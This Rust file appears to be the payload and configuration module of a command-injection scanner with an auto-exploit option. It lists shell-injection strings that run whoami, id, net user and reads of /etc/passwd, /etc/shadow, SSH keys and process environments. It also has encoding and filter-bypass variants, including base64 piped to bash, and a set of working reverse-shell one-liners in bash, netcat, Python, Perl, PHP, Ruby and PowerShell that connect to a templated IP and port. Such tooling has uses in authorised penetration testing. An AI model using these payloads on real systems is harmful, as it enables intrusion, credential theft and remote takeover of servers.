use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CommandInjectionConfig {
    pub url: String,
    pub timeout: u64,
    pub threads: usize,
    pub scan_level: String,
    pub test_get: bool,
    pub test_post: bool,
    pub test_cookies: bool,
    pub test_headers: bool,
    pub custom_parameters: Vec<String>,
    pub auto_exploit: bool,
    pub encoding_bypass: Vec<String>,
    pub test_blind: bool,
    pub test_oob: bool,
    pub reverse_shell_ip: Option<String>,
    pub reverse_shell_port: Option<u16>,
}

impl Default for CommandInjectionConfig {
    fn default() -> Self {
        Self {
            url: String::new(),
            timeout: 15,
            threads: 5,
            scan_level: "moderate".to_string(),
            test_get: true,
            test_post: false,
            test_cookies: false,
            test_headers: false,
            custom_parameters: vec![],
            auto_exploit: false,
            encoding_bypass: vec!["url_double".to_string(), "hex".to_string()],
            test_blind: true,
            test_oob: false,
            reverse_shell_ip: None,
            reverse_shell_port: None,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CommandInjectionResult {
    pub url: String,
    pub vulnerabilities: Vec<CommandInjectionVuln>,
    pub safe_parameters: Vec<CommandInjectionSafeEntry>,
    pub errors: Vec<CommandInjectionErrorEntry>,
    pub tests_performed: usize,
    pub parameters_tested: Vec<String>,
    pub scan_duration_ms: u64,
    pub exploit_results: Vec<ExploitResult>,
    pub blind_injection_results: Vec<BlindInjectionResult>,
    pub encoded_bypass_results: Vec<EncodedBypassResult>,
    pub summary: String,
    pub os_type_distribution: Vec<OsTypeDistribution>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExploitResult {
    pub parameter: String,
    pub exploit_type: String,
    pub command_executed: String,
    pub output: String,
    pub success: bool,
    pub os_detected: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BlindInjectionResult {
    pub parameter: String,
    pub payload: String,
    pub expected_delay_ms: u64,
    pub actual_delay_ms: u64,
    pub is_vulnerable: bool,
    pub method: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EncodedBypassResult {
    pub parameter: String,
    pub original_payload: String,
    pub encoded_payload: String,
    pub encoding_type: String,
    pub success: bool,
    pub evidence: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CommandInjectionVuln {
    pub parameter: String,
    pub injection_type: String,
    pub os_type: String,
    pub severity: String,
    pub payload: String,
    pub evidence: String,
    pub request_url: String,
    pub confidence: f64,
    pub method: String,
    pub response_time_ms: Option<u64>,
    pub http_status: Option<u16>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CommandInjectionSafeEntry {
    pub parameter: String,
    pub tests_run: usize,
    pub method: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CommandInjectionErrorEntry {
    pub parameter: String,
    pub payload: String,
    pub error: String,
    pub method: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OsTypeDistribution {
    pub os_type: String,
    pub count: usize,
    pub vulnerable_count: usize,
}

pub struct CiPayload {
    pub payload: &'static str,
    pub description: &'static str,
    pub severity: &'static str,
    pub injection_type: &'static str,
    pub os_type: &'static str,
}

pub const BASIC_PAYLOADS: &[CiPayload] = &[
    CiPayload { payload: "; whoami", description: "Semicolon whoami", severity: "high", injection_type: "chain", os_type: "linux" },
    CiPayload { payload: "| whoami", description: "Pipe whoami", severity: "high", injection_type: "pipe", os_type: "linux" },
    CiPayload { payload: "&& whoami", description: "AND whoami", severity: "high", injection_type: "chain", os_type: "linux" },
    CiPayload { payload: "$(whoami)", description: "Command sub whoami", severity: "high", injection_type: "substitution", os_type: "linux" },
    CiPayload { payload: "`whoami`", description: "Backtick whoami", severity: "high", injection_type: "substitution", os_type: "linux" },
    CiPayload { payload: "; id", description: "Semicolon id", severity: "high", injection_type: "chain", os_type: "linux" },
    CiPayload { payload: "| id", description: "Pipe id", severity: "high", injection_type: "pipe", os_type: "linux" },
    CiPayload { payload: "& echo /etc/passwd", description: "Ampersand read passwd", severity: "high", injection_type: "chain", os_type: "linux" },
];

pub const MODERATE_PAYLOADS: &[CiPayload] = &[
    CiPayload { payload: "; whoami", description: "Semicolon whoami", severity: "high", injection_type: "chain", os_type: "linux" },
    CiPayload { payload: "| whoami", description: "Pipe whoami", severity: "high", injection_type: "pipe", os_type: "linux" },
    CiPayload { payload: "&& whoami", description: "AND whoami", severity: "high", injection_type: "chain", os_type: "linux" },
    CiPayload { payload: "|| whoami", description: "OR whoami", severity: "medium", injection_type: "chain", os_type: "linux" },
    CiPayload { payload: "$(whoami)", description: "Command sub whoami", severity: "high", injection_type: "substitution", os_type: "linux" },
    CiPayload { payload: "`whoami`", description: "Backtick whoami", severity: "high", injection_type: "substitution", os_type: "linux" },
    CiPayload { payload: "; id", description: "Semicolon id", severity: "high", injection_type: "chain", os_type: "linux" },
    CiPayload { payload: "| id", description: "Pipe id", severity: "high", injection_type: "pipe", os_type: "linux" },
    CiPayload { payload: "&& id", description: "AND id", severity: "high", injection_type: "chain", os_type: "linux" },
    CiPayload { payload: "& cat /etc/passwd", description: "Ampersand read passwd", severity: "critical", injection_type: "chain", os_type: "linux" },
    CiPayload { payload: "; cat /etc/passwd", description: "Semicolon read passwd", severity: "critical", injection_type: "chain", os_type: "linux" },
    CiPayload { payload: "| cat /etc/passwd", description: "Pipe read passwd", severity: "critical", injection_type: "pipe", os_type: "linux" },
    CiPayload { payload: "`cat /etc/passwd`", description: "Backtick read passwd", severity: "critical", injection_type: "substitution", os_type: "linux" },
    CiPayload { payload: "$(cat /etc/passwd)", description: "Command sub read passwd", severity: "critical", injection_type: "substitution", os_type: "linux" },
    CiPayload { payload: "& echo %USERNAME%", description: "Ampersand Windows username", severity: "high", injection_type: "chain", os_type: "windows" },
    CiPayload { payload: "| echo %USERNAME%", description: "Pipe Windows username", severity: "high", injection_type: "pipe", os_type: "windows" },
    CiPayload { payload: "; echo %USERNAME%", description: "Semicolon Windows username", severity: "high", injection_type: "chain", os_type: "windows" },
    CiPayload { payload: "& hostname", description: "Ampersand hostname", severity: "medium", injection_type: "chain", os_type: "windows" },
    CiPayload { payload: "| hostname", description: "Pipe hostname", severity: "medium", injection_type: "pipe", os_type: "windows" },
    CiPayload { payload: "; uname -a", description: "Semicolon uname", severity: "high", injection_type: "chain", os_type: "linux" },
    CiPayload { payload: "\nwhoami", description: "Newline whoami", severity: "high", injection_type: "newline", os_type: "linux" },
    CiPayload { payload: "\nid", description: "Newline id", severity: "high", injection_type: "newline", os_type: "linux" },
    CiPayload { payload: "%0awhoami", description: "URL-encoded newline whoami", severity: "high", injection_type: "newline", os_type: "linux" },
    CiPayload { payload: "%0aid", description: "URL-encoded newline id", severity: "high", injection_type: "newline", os_type: "linux" },
];

pub const AGGRESSIVE_PAYLOADS: &[CiPayload] = &[
    CiPayload { payload: "; whoami", description: "Semicolon whoami", severity: "high", injection_type: "chain", os_type: "linux" },
    CiPayload { payload: "| whoami", description: "Pipe whoami", severity: "high", injection_type: "pipe", os_type: "linux" },
    CiPayload { payload: "&& whoami", description: "AND whoami", severity: "high", injection_type: "chain", os_type: "linux" },
    CiPayload { payload: "|| whoami", description: "OR whoami", severity: "medium", injection_type: "chain", os_type: "linux" },
    CiPayload { payload: "$(whoami)", description: "Command sub whoami", severity: "high", injection_type: "substitution", os_type: "linux" },
    CiPayload { payload: "`whoami`", description: "Backtick whoami", severity: "high", injection_type: "substitution", os_type: "linux" },
    CiPayload { payload: "; id", description: "Semicolon id", severity: "high", injection_type: "chain", os_type: "linux" },
    CiPayload { payload: "| id", description: "Pipe id", severity: "high", injection_type: "pipe", os_type: "linux" },
    CiPayload { payload: "&& id", description: "AND id", severity: "high", injection_type: "chain", os_type: "linux" },
    CiPayload { payload: "& cat /etc/passwd", description: "Ampersand read passwd", severity: "critical", injection_type: "chain", os_type: "linux" },
    CiPayload { payload: "; cat /etc/passwd", description: "Semicolon read passwd", severity: "critical", injection_type: "chain", os_type: "linux" },
    CiPayload { payload: "| cat /etc/passwd", description: "Pipe read passwd", severity: "critical", injection_type: "pipe", os_type: "linux" },
    CiPayload { payload: "`cat /etc/passwd`", description: "Backtick read passwd", severity: "critical", injection_type: "substitution", os_type: "linux" },
    CiPayload { payload: "$(cat /etc/passwd)", description: "Command sub read passwd", severity: "critical", injection_type: "substitution", os_type: "linux" },
    CiPayload { payload: "& echo %USERNAME%", description: "Ampersand Windows username", severity: "high", injection_type: "chain", os_type: "windows" },
    CiPayload { payload: "| echo %USERNAME%", description: "Pipe Windows username", severity: "high", injection_type: "pipe", os_type: "windows" },
    CiPayload { payload: "; echo %USERNAME%", description: "Semicolon Windows username", severity: "high", injection_type: "chain", os_type: "windows" },
    CiPayload { payload: "& hostname", description: "Ampersand hostname", severity: "medium", injection_type: "chain", os_type: "windows" },
    CiPayload { payload: "| hostname", description: "Pipe hostname", severity: "medium", injection_type: "pipe", os_type: "windows" },
    CiPayload { payload: "; uname -a", description: "Semicolon uname", severity: "high", injection_type: "chain", os_type: "linux" },
    CiPayload { payload: "\nwhoami", description: "Newline whoami", severity: "high", injection_type: "newline", os_type: "linux" },
    CiPayload { payload: "\nid", description: "Newline id", severity: "high", injection_type: "newline", os_type: "linux" },
    CiPayload { payload: "%0awhoami", description: "URL-encoded newline whoami", severity: "high", injection_type: "newline", os_type: "linux" },
    CiPayload { payload: "%0aid", description: "URL-encoded newline id", severity: "high", injection_type: "newline", os_type: "linux" },
    CiPayload { payload: "; ls -la /", description: "Semicolon list root", severity: "high", injection_type: "chain", os_type: "linux" },
    CiPayload { payload: "| ls -la /", description: "Pipe list root", severity: "high", injection_type: "pipe", os_type: "linux" },
    CiPayload { payload: "& dir", description: "Ampersand dir", severity: "medium", injection_type: "chain", os_type: "windows" },
    CiPayload { payload: "| dir", description: "Pipe dir", severity: "medium", injection_type: "pipe", os_type: "windows" },
    CiPayload { payload: "; dir", description: "Semicolon dir", severity: "medium", injection_type: "chain", os_type: "windows" },
    CiPayload { payload: "& net user", description: "Ampersand net user", severity: "critical", injection_type: "chain", os_type: "windows" },
    CiPayload { payload: "| net user", description: "Pipe net user", severity: "critical", injection_type: "pipe", os_type: "windows" },
    CiPayload { payload: "; ifconfig", description: "Semicolon ifconfig", severity: "medium", injection_type: "chain", os_type: "linux" },
    CiPayload { payload: "| ifconfig", description: "Pipe ifconfig", severity: "medium", injection_type: "pipe", os_type: "linux" },
    CiPayload { payload: "& ipconfig", description: "Ampersand ipconfig", severity: "medium", injection_type: "chain", os_type: "windows" },
    CiPayload { payload: "| ipconfig", description: "Pipe ipconfig", severity: "medium", injection_type: "pipe", os_type: "windows" },
    CiPayload { payload: "; cat /etc/shadow", description: "Semicolon read shadow", severity: "critical", injection_type: "chain", os_type: "linux" },
    CiPayload { payload: "| cat /etc/shadow", description: "Pipe read shadow", severity: "critical", injection_type: "pipe", os_type: "linux" },
    CiPayload { payload: "& type C:\\Windows\\win.ini", description: "Ampersand read win.ini", severity: "critical", injection_type: "chain", os_type: "windows" },
    CiPayload { payload: "| type C:\\Windows\\win.ini", description: "Pipe read win.ini", severity: "critical", injection_type: "pipe", os_type: "windows" },
    CiPayload { payload: "{{7*7}}", description: "Template injection probe", severity: "medium", injection_type: "template", os_type: "unknown" },
    CiPayload { payload: "${7*7}", description: "Expression language probe", severity: "medium", injection_type: "template", os_type: "unknown" },
    CiPayload { payload: "<%= 7*7 %>", description: "ERB template probe", severity: "medium", injection_type: "template", os_type: "unknown" },
];

pub const LINUX_INDICATORS: &[&str] = &[
    "uid=",
    "gid=",
    "groups=",
    "root:",
    "bin/bash",
    "bin/sh",
    "/home/",
    "/etc/passwd",
    "/etc/shadow",
    "total ",
    "drwx",
    "-rwx",
    "lrwx",
    "Linux",
    "GNU/Linux",
    "bash:",
    "sh:",
    "/bin/",
    "/usr/",
    "/var/",
    "/tmp/",
    "no such file",
    "command not found",
    "permission denied",
];

pub const WINDOWS_INDICATORS: &[&str] = &[
    "Volume Serial Number",
    "Directory of",
    "bytes free",
    "Windows",
    "Microsoft Corporation",
    "All User Profile",
    "ADMIN$",
    "C$",
    "IPC$",
    "The command completed successfully",
    ".exe",
    ".dll",
    "System32",
    "Program Files",
    "AppData",
    "HKEY_",
    "REGISTRY",
    "Volume in drive",
    "File(s)",
    "Dir(s)",
];

pub const TIME_DELAY_PAYLOADS: &[(&str, u64)] = &[
    ("; sleep 5", 5),
    ("| sleep 5", 5),
    ("&& sleep 5", 5),
    ("& timeout 5", 5),
    ("|| sleep 5", 5),
    ("\nsleep 5", 5),
    ("%0asleep 5", 5),
    ("; ping -c 5 127.0.0.1", 5),
    ("| ping -c 5 127.0.0.1", 5),
    ("& ping -n 5 127.0.0.1", 5),
];

pub const USER_AGENTS: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
];

pub const ENCODING_BYPASS_PAYLOADS: &[(&str, &str, &str)] = &[
    ("; whoami", "%3B%20whoami", "url_single"),
    ("; whoami", "%253B%2520whoami", "url_double"),
    ("; whoami", "\\x3b\\x20whoami", "hex"),
    ("; whoami", "\\073\\040whoami", "octal"),
    ("; whoami", "$'\\x3b whoami'", "bash_escape"),
    ("| whoami", "%7C%20whoami", "url_single"),
    ("| whoami", "%257C%2520whoami", "url_double"),
    ("| whoami", "\\x7c\\x20whoami", "hex"),
    ("&& whoami", "%26%26%20whoami", "url_single"),
    ("&& whoami", "%2526%2526%2520whoami", "url_double"),
    ("$(whoami)", "%24%28whoami%29", "url_single"),
    ("$(whoami)", "%2524%2528whoami%2529", "url_double"),
    ("`whoami`", "%60whoami%60", "url_single"),
    ("`whoami`", "%2560whoami%2560", "url_double"),
    ("\nwhoami", "%0awhoami", "url_single"),
    ("\nwhoami", "%250awhoami", "url_double"),
];

pub const REVERSE_SHELL_PAYLOADS: &[(&str, &str)] = &[
    ("bash_tcp", "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"),
    ("bash_udp", "bash -i >& /dev/udp/{IP}/{PORT} 0>&1"),
    ("nc_e", "nc -e /bin/bash {IP} {PORT}"),
    ("nc_mkfifo", "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc {IP} {PORT} > /tmp/f"),
    ("python", "python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"{IP}\",{PORT})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/bash\",\"-i\"]);'"),
    ("perl", "perl -e 'use Socket; $i=\"{IP}\"; $p={PORT}; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); connect(S,sockaddr_in($p,inet_aton($i))); open(STDIN,\">&S\"); open(STDOUT,\">&S\"); open(STDERR,\">&S\"); exec(\"/bin/bash -i\");'"),
    ("php", "php -r '$s=fsockopen(\"{IP}\",{PORT}); exec(\"/bin/bash -i <&3 >&3 2>&3\");'"),
    ("ruby", "ruby -rsocket -e'f=TCPSocket.open(\"{IP}\",{PORT}).to_i; exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'"),
    ("powershell", "$client = New-Object System.Net.Sockets.TCPClient('{IP}',{PORT}); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{{0}}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2>&1 | Out-String); $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }}; $client.Close()"),
];

pub const FILE_READ_PAYLOADS: &[(&str, &str)] = &[
    ("linux_etc_passwd", "; cat /etc/passwd"),
    ("linux_etc_shadow", "; cat /etc/shadow"),
    ("linux_etc_hosts", "; cat /etc/hosts"),
    ("linux_proc_self_environ", "; cat /proc/self/environ"),
    ("linux_proc_version", "; cat /proc/version"),
    ("linux_home_bashrc", "; cat ~/.bashrc"),
    ("linux_ssh_key", "; cat ~/.ssh/id_rsa.pub"),
    ("linux_etc_issue", "; cat /etc/issue"),
    ("linux_etc_release", "; cat /etc/os-release"),
    ("windows_win_ini", "& type C:\\Windows\\win.ini"),
    ("windows_boot_ini", "& type C:\\boot.ini"),
    ("windows_system_info", "& systeminfo"),
];

pub const FILTER_BYPASS_PAYLOADS: &[(&str, &str, &str)] = &[
    ("space_bypass_tab", ";cat\t/etc/passwd", "space_bypass"),
    ("space_bypass_ifs", ";cat${IFS}/etc/passwd", "space_bypass"),
    ("space_bypass_brace", ";{cat,/etc/passwd}", "space_bypass"),
    ("keyword_bypass_single_quote", ";c'a't /etc/passwd", "keyword_bypass"),
    ("keyword_bypass_double_quote", ";c\"a\"t /etc/passwd", "keyword_bypass"),
    ("keyword_bypass_backslash", ";c\\at /etc/passwd", "keyword_bypass"),
    ("keyword_bypass_variable", ";a=cat;b=/etc/passwd;$a $b", "keyword_bypass"),
    ("keyword_bypass_base64", ";echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash", "keyword_bypass"),
    ("keyword_bypass_hex", ";$(printf '\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64')", "keyword_bypass"),
    ("path_bypass_symlink", ";ln -s /etc/passwd /tmp/p;cat /tmp/p", "path_bypass"),
    ("path_bypass_wildcard", ";cat /???/??????", "path_bypass"),
    ("path_bypass_home", ";cat ~/../../etc/passwd", "path_bypass"),
];
